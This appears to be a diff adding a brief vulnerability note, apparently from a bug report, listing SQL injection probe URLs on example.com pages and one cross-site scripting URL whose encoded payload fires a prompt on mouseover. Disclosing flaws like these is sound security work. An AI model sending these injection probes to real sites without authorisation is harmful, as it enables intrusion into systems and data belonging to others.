@@ -1,0 +1,11 @@
+1. Sql injection
+
+http://www.example.com/default1.aspx?siteid=1'
+http://www.example.com/archive.aspx?sid=19&siteid=1'
+http://www.example.com/archive.aspx?sid=19'
+http://www.example.com/about.aspx?siteid=1'
+		
+
+2. Cross-site scripting:
+
+http://www.example.com/showdata.aspx?dataid=%22%20onmouseover%3Dprompt%28%27XSS-from-BugReport%27%29%20continue%3D%22&siteid=1
